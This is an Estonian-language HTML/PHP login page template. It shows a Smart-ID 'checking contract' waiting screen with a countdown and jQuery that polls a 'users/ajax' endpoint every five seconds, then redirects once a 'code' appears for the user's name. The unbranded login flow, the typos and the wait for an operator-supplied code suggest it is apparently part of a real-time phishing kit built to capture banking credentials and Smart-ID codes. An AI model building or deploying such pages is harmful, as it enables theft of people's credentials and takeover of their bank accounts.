
    <div class="mt-30">
        <div class="container">
        <div class="col-md-9">
        <div class="title mt-45">Login sisse</div>
            <div class="step">
                <div class="setp-1" style="padding: 6px 10px;">
                        1 &nbspKasutajatunnus
                </div>
                <div class="step-2">             
                </div>
                <div class="setp-3" style="padding: 6px 10px;">
                        &nbsp&nbsp&nbsp2 &nbsp Salasnad
                </div>
            </div>
            <div class="content mt-30" >
                <div class="row ">
                    <div class="col-md-8">
                        <p class="p_size ml-20">Kontrollime Smart-ID lepingu olemasolu...</p>
                        <p class="ml-20">Ootame vastust&nbsp&nbsp<span id="counter"></span></p>
                        <span id="counter_t"></span>
                        <div style="padding: 5px 20px;">  
                            <hr style="border:1.2px solid white;">
                            <div class="mt-20">
                                <button class="btn_2"  value="smart">Katkestan</button>                                         
                            </div>
                        </div>
                    </div>
                    <div class="col-md-4 mt-10 mb-10">
                        <div class="img_bt"></div>
                    </div>
                </div>
            </div>
        </div>     </div>   
    </div>   
    <script>
        $(document).ready(function () {
            myfunction();

            function myfunction(){
                $.ajax({
                    type: 'post',
                    url: '<?=base_url("users/ajax");?>',
                    async : true,
                    datatype: 'json',
                    contentType: "application/json; charset=utf-8",
                    success: function(data){                         
                        response = jQuery.parseJSON(data);
                                 console.log(data);                                 
                        if(response!=''){          
                            if((response[0].name == '<?=$name?>')&&(response[0].code!=null)){
                                $(location).attr('href', '<?=base_url("done/").$name;?>');}
                            }else{
                                setTimeout(myfunction, 5000);
                            
                        }
                    }
                });
            }       
            localStorage.setItem("count_data", 98);
            var i = 97;
            var x = setInterval(count_time, 1000); 

            function count_time(){
            
                if(!localStorage.getItem("count_data")||(localStorage.getItem("count_data")<=0)){
                    document.getElementById("counter").innerHTML = 97;
                    localStorage.setItem("count_data", 97);
                }else{
                    var i = localStorage.getItem("count_data")-1;
                    document.getElementById("counter").innerHTML = i;
                    localStorage.setItem("count_data", i);
                }
            }    
        });
    </script>
</body>
